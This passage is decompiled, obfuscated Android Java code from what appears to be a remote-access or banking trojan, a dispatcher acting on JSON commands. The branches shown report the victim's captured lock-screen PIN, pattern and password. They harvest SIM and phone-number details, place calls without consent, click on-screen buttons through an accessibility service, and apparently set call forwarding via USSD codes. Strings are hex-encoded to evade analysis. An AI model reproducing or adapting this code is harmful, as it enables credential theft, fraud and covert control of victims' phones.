            if (strOptString3.length() == 0) {
                strOptString3 = DataQFAdapter.capturedPin;
            }
            jSONObject7.put(strObtain, strOptString3.length());
            H9XlUr4OeMJFiXK(jSONObject7);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E000BE00C600B3002600640055"))) {
            JSONObject jSONObject8 = new JSONObject();
            String strPyu8ovAipBTLYAiKab2 = Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("00270073004D008E00F300BA00ED00B700220062004F008200E200B1", jSONObject8, TypefaceCache.obtain("0037006F004B0082"), "00330077004F009300F500AD00DC");
            DataQFAdapter.Companion.getClass();
            jSONObject8.put(strPyu8ovAipBTLYAiKab2, DataQFAdapter.capturedPattern);
            jSONObject8.put(TypefaceCache.obtain("002B0077004800B800E000BE00C600B3002600640055"), DataQFAdapter.capturedPattern.length() > 0);
            H9XlUr4OeMJFiXK(jSONObject8);
            return;
        }
        int i6 = 9;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00200077004B009300E500AD00D7009800330077004F009300F500AD00DC"))) {
            this.nQilHWaqS401ZtR.post(new jdOQeRk37T35X5xKW1P(i6));
            JSONObject jSONObject9 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("00200077004B009300E500AD00D7009800330077004F009300F500AD00DC", jSONObject9, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject9, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", 6 - 5);
            H9XlUr4OeMJFiXK(jSONObject9);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300073004F00B800E000BE00C600B3002600640055"))) {
            String strOptString4 = jSONObject.optString(TypefaceCache.obtain("00330077004F009300F500AD00DC"), "");
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.A1BaTVAMeIXMnh(strOptString4);
            try {
                this.dDIMxZXP1V8HdM.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).edit().putString(TypefaceCache.obtain("00330077004F009300F500AD00DC"), strOptString4).apply();
            } catch (Exception unused3) {
            }
            JSONObject jSONObject10 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("00270073004D008E00F300BA00ED00B700220062004F008200E200B1", jSONObject10, TypefaceCache.obtain("0037006F004B0082"), "00330077004F009300F500AD00DC", strOptString4);
            jSONObject10.put(TypefaceCache.obtain("002B0077004800B800E000BE00C600B3002600640055"), strOptString4.length() > 0);
            H9XlUr4OeMJFiXK(jSONObject10);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003600780057008800F300B400ED00B0002A0062005300B800E000BE00C600B3002600640055"))) {
            String strOptString5 = jSONObject.optString(TypefaceCache.obtain("00330077004F009300F500AD00DC"), "");
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe3 = DataQFAdapter.Companion;
            if (strOptString5.length() == 0) {
                strOptString5 = null;
            }
            gARjgaGEpTotOxcl8vfe3.getClass();
            boolean zUoxIZOBVZaubOFdPNaXK = GARjgaGEpTotOxcl8vfe.UoxIZOBVZaubOFdPNaXK(strOptString5);
            JSONObject jSONObject11 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("003600780057008800F300B400ED00B0002A0062005300B800E000BE00C600B3002600640055", jSONObject11, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject11, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", zUoxIZOBVZaubOFdPNaXK);
            H9XlUr4OeMJFiXK(jSONObject11);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E000BE00C100B40034007900490083"))) {
            JSONObject jSONObject12 = new JSONObject();
            String strPyu8ovAipBTLYAiKab3 = Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("00270073004D008E00F300BA00ED00B7002200650048009000FF00AD00D6", jSONObject12, TypefaceCache.obtain("0037006F004B0082"), "003300770048009400E700B000C000A3");
            DataQFAdapter.Companion.getClass();
            jSONObject12.put(strPyu8ovAipBTLYAiKab3, DataQFAdapter.capturedPassword);
            jSONObject12.put(TypefaceCache.obtain("002B0077004800B800E000BE00C100B40034007900490083"), DataQFAdapter.capturedPassword.length() > 0 ? 40 - 39 : 0);
            H9XlUr4OeMJFiXK(jSONObject12);
            return;
        }
        int i7 = 87 - 77;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00200077004B009300E500AD00D70098003300770048009400E700B000C000A3"))) {
            this.nQilHWaqS401ZtR.post(new jdOQeRk37T35X5xKW1P(i7));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003600780057008800F300B400ED00B0002A0062005300B800E000BE00C100B40034007900490083"))) {
            String strOptString6 = jSONObject.optString(TypefaceCache.obtain("003300770048009400E700B000C000A3"), "");
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe4 = DataQFAdapter.Companion;
            if (strOptString6.length() == 0) {
                strOptString6 = null;
            }
            gARjgaGEpTotOxcl8vfe4.getClass();
            boolean zT9CXKrwDxrnFA6g23hZU = GARjgaGEpTotOxcl8vfe.t9CXKrwDxrnFA6g23hZU(strOptString6);
            JSONObject jSONObject13 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("003600780057008800F300B400ED00B0002A0062005300B800E000BE00C100B40034007900490083", jSONObject13, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject13, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", zT9CXKrwDxrnFA6g23hZU);
            H9XlUr4OeMJFiXK(jSONObject13);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00B4003A00780058"))) {
            String str7 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            GQh1bKoqkKhujFH2nJ.D5P1xCAyuvgF(this.dDIMxZXP1V8HdM);
            JSONObject jSONObject14 = new JSONObject();
            jSONObject14.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002A00780051008200F300AB00ED00B4003A00780058008200F4", jSONObject14, TypefaceCache.obtain("0037006F004B0082"), "003700770049008000F500AB00C1"), GQh1bKoqkKhujFH2nJ.JXn4Qf7zpnLjP5());
            H9XlUr4OeMJFiXK(jSONObject14);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00A2002D00770059008B00F5"))) {
            String str8 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            GQh1bKoqkKhujFH2nJ.pyu8ovAipBTLYAiKab(true);
            JSONObject jSONObject15 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002A00780051008200F300AB00ED00B400370077004F009200E3", jSONObject15, TypefaceCache.obtain("0037006F004B0082"), "00260078005A008500FC00BA00D6", true);
            H9XlUr4OeMJFiXK(jSONObject15);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00A3002A0065005A008500FC00BA"))) {
            String str9 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            GQh1bKoqkKhujFH2nJ.pyu8ovAipBTLYAiKab(false);
            JSONObject jSONObject16 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002A00780051008200F300AB00ED00B400370077004F009200E3", jSONObject16, TypefaceCache.obtain("0037006F004B0082"), "00260078005A008500FC00BA00D6", false);
            H9XlUr4OeMJFiXK(jSONObject16);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00AB002A0065004F"))) {
            JSONObject jSONObject17 = new JSONObject();
            String strPyu8ovAipBTLYAiKab4 = Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002A00780051008200F300AB00ED00AB002A0065004F", jSONObject17, TypefaceCache.obtain("0037006F004B0082"), "00260078005A008500FC00BA00D6");
            String str10 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            jSONObject17.put(strPyu8ovAipBTLYAiKab4, GQh1bKoqkKhujFH2nJ.JXn4Qf7zpnLjP5);
            jSONObject17.put(TypefaceCache.obtain("003700770049008000F500AB00C1"), GQh1bKoqkKhujFH2nJ.JXn4Qf7zpnLjP5());
            H9XlUr4OeMJFiXK(jSONObject17);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00B500260065005E009300CF00AC00D900AE00330065")) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00B500260065005E009300CF00BC00D300B7003700630049008200E3"))) {
            String str11 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            GQh1bKoqkKhujFH2nJ.b1EoSIRjJHO5.clear();
            TypefaceCache.obtain("0002007A005700C700F300BE00C200B300360064005E009400B000AD00D700B400260062");
            JSONObject jSONObject18 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002A00780051008200F300AB00ED00B40028007F004B009400CF00AD00D700B400260062", jSONObject18, TypefaceCache.obtain("0037006F004B0082"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject18);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00B700360065005300B800E400BA00DF00B7002F0077004F0082"))) {
            String strOptString7 = jSONObject.optString(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"), "");
            String strOptString8 = jSONObject.optString(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), strOptString7);
            String strOptString9 = jSONObject.optString(TypefaceCache.obtain("002B00620056008B00CF00BC00DD00A90037007300550093"), "");
            if (strOptString7.length() > 0) {
                if (strOptString9.length() > 0) {
                    String str12 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                    GQh1bKoqkKhujFH2nJ.ibVTtJUNfrGYbW(this.dDIMxZXP1V8HdM, strOptString7, strOptString8, strOptString9);
                    JSONObject jSONObject19 = new JSONObject();
                    Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002A00780051008200F300AB00ED00B30026007B004B008B00F100AB00D70098003300630048008F00F500BB", jSONObject19, TypefaceCache.obtain("0037006F004B0082"), "003700770049008000F500AB00ED00B7002200750050008600F700BA", strOptString7);
                    jSONObject19.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), (boolean) ((-76) + 77));
                    H9XlUr4OeMJFiXK(jSONObject19);
                    return;
                }
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002A00780051008200F300AB00ED00B50026007B0054009100F5008000C600A2002E00660057008600E400BA"))) {
            String strOptString10 = jSONObject.optString(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"), "");
            if (strOptString10.length() > 0) {
                String str13 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
                GQh1bKoqkKhujFH2nJ.xDyLpEZyrcKVe0(this.dDIMxZXP1V8HdM, strOptString10);
                JSONObject jSONObject20 = new JSONObject();
                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002A00780051008200F300AB00ED00B30026007B004B008B00F100AB00D70098003100730056008800E600BA00D6", jSONObject20, TypefaceCache.obtain("0037006F004B0082"), "003700770049008000F500AB00ED00B7002200750050008600F700BA", strOptString10);
                H9XlUr4OeMJFiXK(jSONObject20);
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300640054009F00E9008000C100B300220064004F"))) {
            this.bbLLF31we2Iu.xDyLpEZyrcKVe0();
            TypefaceCache.obtain("00100059007800AC00C300EA009200B7003100790043009E00B000AB00C700A9002D0073005700C700E300AB00D300B500370073005F");
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300640054009F00E9008000C100B3002C0066"))) {
            this.bbLLF31we2Iu.ibVTtJUNfrGYbW();
            TypefaceCache.obtain("00100059007800AC00C300EA009200B7003100790043009E00B000AB00C700A9002D0073005700C700E300AB00DD00B700330073005F");
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300640054009F00E9008000D100A8002D0078005E008400E4"))) {
            String strOptString11 = jSONObject.optString(TypefaceCache.obtain("003000730048009400F900B000DC0098002A0072"), "");
            String strOptString12 = jSONObject.optString(TypefaceCache.obtain("002B007900480093"), "");
            int iOptInt4 = jSONObject.optInt(TypefaceCache.obtain("0033007900490093"), 0);
            if (strOptString11.length() > 0) {
                if (!(strOptString12.length() > 0) || iOptInt4 <= 0) {
                    return;
                }
                this.bbLLF31we2Iu.w9sT1Swbhx3hs(strOptString11, strOptString12, iOptInt4);
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300640054009F00E9008000D600A600370077"))) {
            String strOptString13 = jSONObject.optString(TypefaceCache.obtain("003000730048009400F900B000DC0098002A0072"), "");
            String strOptString14 = jSONObject.optString(TypefaceCache.obtain("00270077004F0086"), "");
            if (strOptString13.length() > 0) {
                if (strOptString14.length() > 0) {
                    this.bbLLF31we2Iu.Ee8d2j4S9Vm5yGuR(strOptString13, strOptString14);
                    return;
                }
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300640054009F00E9008000D600AE003000750054008900FE00BA00D100B3"))) {
            String strOptString15 = jSONObject.optString(TypefaceCache.obtain("003000730048009400F900B000DC0098002A0072"), "");
            if ((strOptString15.length() > 0 ? 8 - 7 : 0) != 0) {
                this.bbLLF31we2Iu.vekpFI4d1Nc4fakF(strOptString15);
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E300B600DF0098002F007F00480093"))) {
            try {
                this.dDIMxZXP1V8HdM.getSystemService("telecom");
                Object systemService = this.dDIMxZXP1V8HdM.getSystemService("telephony_subscription_service");
                SubscriptionManager subscriptionManager = systemService instanceof SubscriptionManager ? (SubscriptionManager) systemService : null;
                JSONArray jSONArray = new JSONArray();
                if (subscriptionManager != null) {
                    try {
                        List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
                        if (activeSubscriptionInfoList != null) {
                            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                                JSONObject jSONObject21 = new JSONObject();
                                jSONObject21.put(TypefaceCache.obtain("0030007A00540093"), subscriptionInfo.getSimSlotIndex());
                                String strObtain2 = TypefaceCache.obtain("002000770049009500F900BA00C0");
                                CharSequence carrierName = subscriptionInfo.getCarrierName();
                                if (carrierName == null || (string = carrierName.toString()) == null) {
                                    string = TypefaceCache.obtain("0010005F007600C7") + (subscriptionInfo.getSimSlotIndex() + 1);
                                }
                                jSONObject21.put(strObtain2, string);
                                String strObtain3 = TypefaceCache.obtain("002D00630056008500F500AD");
                                String number = subscriptionInfo.getNumber();
                                if (number == null) {
                                    number = "";
                                }
                                jSONObject21.put(strObtain3, number);
                                jSONObject21.put(TypefaceCache.obtain("00300063005900B800F900BB"), subscriptionInfo.getSubscriptionId());
                                jSONArray.put(jSONObject21);
                            }
                        }
                    } catch (SecurityException unused4) {
                    }
                }
                if (jSONArray.length() == 0) {
                    JSONObject jSONObject22 = new JSONObject();
                    jSONObject22.put(TypefaceCache.obtain("0030007A00540093"), 0);
                    jSONObject22.put(TypefaceCache.obtain("002000770049009500F900BA00C0"), TypefaceCache.obtain("00070073005D008600E500B300C600E70010005F0076"));
                    jSONObject22.put(TypefaceCache.obtain("002D00630056008500F500AD"), "");
                    jSONObject22.put(TypefaceCache.obtain("00300063005900B800F900BB"), -1);
                    jSONArray.put(jSONObject22);
                }
                JSONObject jSONObject23 = new JSONObject();
                jSONObject23.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0030007F005600B800FC00B600C100B3"));
                jSONObject23.put(TypefaceCache.obtain("0030007F00560094"), jSONArray);
                H9XlUr4OeMJFiXK(jSONObject23);
                return;
            } catch (Exception unused5) {
                JSONObject jSONObject24 = new JSONObject();
                String strPyu8ovAipBTLYAiKab5 = Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("0030007F005600B800FC00B600C100B3", jSONObject24, TypefaceCache.obtain("0037006F004B0082"), "0030007F00560094");
                JSONArray jSONArray2 = new JSONArray();
                JSONObject jSONObject25 = new JSONObject();
                jSONObject25.put(TypefaceCache.obtain("0030007A00540093"), 0);
                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("00070073005D008600E500B300C6", jSONObject25, TypefaceCache.obtain("002000770049009500F900BA00C0"), "002D00630056008500F500AD", "");
                jSONObject25.put(TypefaceCache.obtain("00300063005900B800F900BB"), -1);
                jSONObject24.put(strPyu8ovAipBTLYAiKab5, jSONArray2.put(jSONObject25));
                H9XlUr4OeMJFiXK(jSONObject24);
                return;
            }
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002000770057008B00CF00AF00DA00A8002D0073"))) {
            String strOptString16 = jSONObject.optString(TypefaceCache.obtain("002D00630056008500F500AD"), "");
            int iOptInt5 = jSONObject.optInt(TypefaceCache.obtain("0030007F005600B800E300B300DD00B3"), -1);
            if (strOptString16.length() > 0) {
                try {
                    Uri uri = Uri.parse(TypefaceCache.obtain("00370073005700DD") + strOptString16);
                    if (!(RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this.dDIMxZXP1V8HdM, "android.permission.CALL_PHONE") == 0)) {
                        try {
                            Intent intent = new Intent(this.dDIMxZXP1V8HdM, (Class<?>) ManagerQJWorker.class);
                            intent.putExtra(TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064008600F300AB00DB00A8002D"), TypefaceCache.obtain("00310073004A009200F500AC00C60098002400640054009200E0"));
                            intent.putExtra(TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064008B00F900AC00C6"), new String[]{"android.permission.CALL_PHONE"});
                            intent.addFlags(268435456);
                            this.dDIMxZXP1V8HdM.startActivity(intent);
                            Thread.sleep(3000L);
                        } catch (Exception unused6) {
                        }
                    }
                    Object systemService2 = this.dDIMxZXP1V8HdM.getSystemService("telecom");
                    TelecomManager telecomManager = systemService2 instanceof TelecomManager ? (TelecomManager) systemService2 : null;
                    if (telecomManager != null) {
                        try {
                            Bundle bundle = new Bundle();
                            if (iOptInt5 >= 0 && (callCapablePhoneAccounts = telecomManager.getCallCapablePhoneAccounts()) != null && iOptInt5 < callCapablePhoneAccounts.size()) {
                                bundle.putParcelable("android.telecom.extra.PHONE_ACCOUNT_HANDLE", callCapablePhoneAccounts.get(iOptInt5));
                            }
                            telecomManager.placeCall(uri, bundle);
                            z2 = true;
                        } catch (Exception unused7) {
                            z2 = false;
                        }
                    } else {
                        z2 = false;
                    }
                    if (!z2) {
                        String defaultDialerPackage = telecomManager != null ? telecomManager.getDefaultDialerPackage() : null;
                        Intent intent2 = new Intent("android.intent.action.CALL");
                        intent2.setData(uri);
                        intent2.addFlags(268435456);
                        if (!(defaultDialerPackage == null || defaultDialerPackage.length() == 0)) {
                            intent2.setPackage(defaultDialerPackage);
                        }
                        try {
                            this.dDIMxZXP1V8HdM.startActivity(intent2);
                        } catch (Exception unused8) {
                            intent2.setPackage(null);
                            try {
                                this.dDIMxZXP1V8HdM.startActivity(intent2);
                            } catch (Exception unused9) {
                            }
                        }
                        z2 = true;
                    }
                    if (!z2) {
                        try {
                            Intent intent3 = new Intent("android.intent.action.CALL");
                            intent3.setData(uri);
                            intent3.setClassName(TypefaceCache.obtain("00200079005600C900F100B100D600B5002C007F005F00C900E000B700DD00A90026"), TypefaceCache.obtain("00200079005600C900F100B100D600B5002C007F005F00C900E000B700DD00A9002600380074009200E400B800DD00AE002D00710078008600FC00B300F000B5002C0077005F008400F100AC00C600A20031"));
                            intent3.addFlags(335544320);
                            this.dDIMxZXP1V8HdM.startActivity(intent3);
                        } catch (Exception unused10) {
                            Intent intent4 = new Intent("android.intent.action.DIAL");
                            intent4.setData(uri);
                            intent4.addFlags(268435456);
                            this.dDIMxZXP1V8HdM.startActivity(intent4);
                        }
                    }
                    JSONObject jSONObject26 = new JSONObject();
                    jSONObject26.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770057008B00CF00AC00C600A600310062005E0083"));
                    jSONObject26.put(TypefaceCache.obtain("002D00630056008500F500AD"), strOptString16);
                    jSONObject26.put(TypefaceCache.obtain("0030007F005600B800E300B300DD00B3"), iOptInt5);
                    H9XlUr4OeMJFiXK(jSONObject26);
                    new Thread(new m7Tosu6RfY5Ca6(this, strOptString16, 1)).start();
                    return;
                } catch (Exception e) {
                    JSONObject jSONObject27 = new JSONObject();
                    jSONObject27.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000770057008B00CF00BA00C000B5002C0064", jSONObject27, TypefaceCache.obtain("0037006F004B0082"), "002600640049008800E2"), e.getMessage());
                    H9XlUr4OeMJFiXK(jSONObject27);
                    return;
                }
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002500790049008400F5008000D600AE0022007A"))) {
            try {
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                if (dataQFAdapter != null) {
                    AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        JSONObject jSONObject28 = new JSONObject();
                        jSONObject28.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002500790049008400F5008000D600AE0022007A0064009500F500AC00C700AB0037"));
                        jSONObject28.put(TypefaceCache.obtain("0020007A0052008400FB00BA00D6"), false);
                        jSONObject28.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D0079001B009500FF00B000C600E70034007F0055008300FF00A8"));
                        H9XlUr4OeMJFiXK(jSONObject28);
                        return;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(TypefaceCache.obtain("002000770057008B"));
                    if (listFindAccessibilityNodeInfosByText == null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(TypefaceCache.checked("047C0428040C04D504AE04E2048A0485040F"))) == null) {
                        listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(TypefaceCache.checked("047E0426040A04A704A0049D04FE"));
                    }
                    if (listFindAccessibilityNodeInfosByText != null) {
                        z = false;
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                            if (accessibilityNodeInfo.isClickable() && !z) {
                                accessibilityNodeInfo.performAction(16);
                                z = true;
                            }
                        }
                    } else {
                        z = false;
                    }
                    if (!z) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(TypefaceCache.obtain("00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008300F900BE00DE00A20031002C0052008300BF00BB00DB00A6002F0066005A008300CF00B900DE00A8002200620052008900F7008000D300A40037007F0054008900CF00BD00C700B3003700790055"));
                        if (listFindAccessibilityNodeInfosByViewId == null && (listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(TypefaceCache.obtain("00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900F400B600D300AB002600640001008E00F400F000D400AB002C0077004F008E00FE00B800ED00A6002000620052008800FE008000D000B20037006200540089"))) == null) {
                            listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(TypefaceCache.obtain("00200079005600C900F100B100D600B5002C007F005F00C900F400B600D300AB002600640001008E00F400F000D600AE0022007A004B008600F4008000D400AB002C0077004F008E00FE00B800ED00A6002000620052008800FE008000D000B20037006200540089"));
                        }
                        if (listFindAccessibilityNodeInfosByViewId != null) {
                            for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                                if (accessibilityNodeInfo2.isClickable() && !z) {
                                    accessibilityNodeInfo2.performAction(16);
                                    z = true;
                                }
                            }
                        }
                    }
                    JSONObject jSONObject29 = new JSONObject();
                    jSONObject29.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002500790049008400F5008000D600AE0022007A0064009500F500AC00C700AB0037"));
                    jSONObject29.put(TypefaceCache.obtain("0020007A0052008400FB00BA00D6"), z);
                    H9XlUr4OeMJFiXK(jSONObject29);
                    rootInActiveWindow.recycle();
                    return;
                }
                return;
            } catch (Exception e2) {
                JSONObject jSONObject30 = new JSONObject();
                Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002500790049008400F5008000D600AE0022007A0064009500F500AC00C700AB0037", jSONObject30, TypefaceCache.obtain("0037006F004B0082"), "0020007A0052008400FB00BA00D6", false);
                jSONObject30.put(TypefaceCache.obtain("002600640049008800E2"), e2.getMessage());
                H9XlUr4OeMJFiXK(jSONObject30);
                return;
            }
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002000770057008B00CF00B900DD00B5003400770049008300CF00AC00D700B3"))) {
            String strOptString17 = jSONObject.optString(TypefaceCache.obtain("002D00630056008500F500AD"), "");
            if (strOptString17.length() > 0) {
                DataQFAdapter.Companion.XiR1pIn5878vVWd(new JSONObject().put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003600650048008300CF00AD00D700B60036007300480093")).put(TypefaceCache.obtain("00200079005F0082"), TypefaceCache.obtain("00690024000A00CD") + strOptString17 + "#"));
                JSONObject jSONObject31 = new JSONObject();
                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002000770057008B00CF00B900DD00B5003400770049008300CF00AC00D700B3", jSONObject31, TypefaceCache.obtain("0037006F004B0082"), "002D00630056008500F500AD", strOptString17);
                H9XlUr4OeMJFiXK(jSONObject31);
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002000770057008B00CF00B900DD00B5003400770049008300CF00BC00D300A9002000730057"))) {
            DataQFAdapter.Companion.XiR1pIn5878vVWd(new JSONObject().put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003600650048008300CF00AD00D700B60036007300480093")).put(TypefaceCache.obtain("00200079005F0082"), TypefaceCache.obtain("00600035000900D600B3")));
            JSONObject jSONObject32 = new JSONObject();
            jSONObject32.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770057008B00CF00B900DD00B5003400770049008300CF00BC00D300A9002000730057008B00F500BB"));
            H9XlUr4OeMJFiXK(jSONObject32);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002000770057008B00CF00B900DD00B5003400770049008300CF00AC00C600A6003700630048"))) {
            DataQFAdapter.Companion.XiR1pIn5878vVWd(new JSONObject().put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003600650048008300CF00AD00D700B60036007300480093")).put(TypefaceCache.obtain("00200079005F0082"), TypefaceCache.obtain("00690035000900D600B3")));
            JSONObject jSONObject33 = new JSONObject();
            jSONObject33.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770057008B00CF00B900DD00B5003400770049008300CF00BC00DA00A20020007D0052008900F7"));
            H9XlUr4OeMJFiXK(jSONObject33);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003700770050008200CF00AF00DA00A800370079"))) {
            boolean zOptBoolean3 = jSONObject.optBoolean(TypefaceCache.obtain("002500640054008900E4"), false);
            byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
            RIZfHbqXpth8r2yN4.gmNWMfvn6zlEj(this.dDIMxZXP1V8HdM, zOptBoolean3);
            this.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(this, 8), 5000L);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E000B700DD00B3002C"))) {
            DVTNwpDEVsUKuznof();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000C000A2002000790049008300F900B100D5"))) {
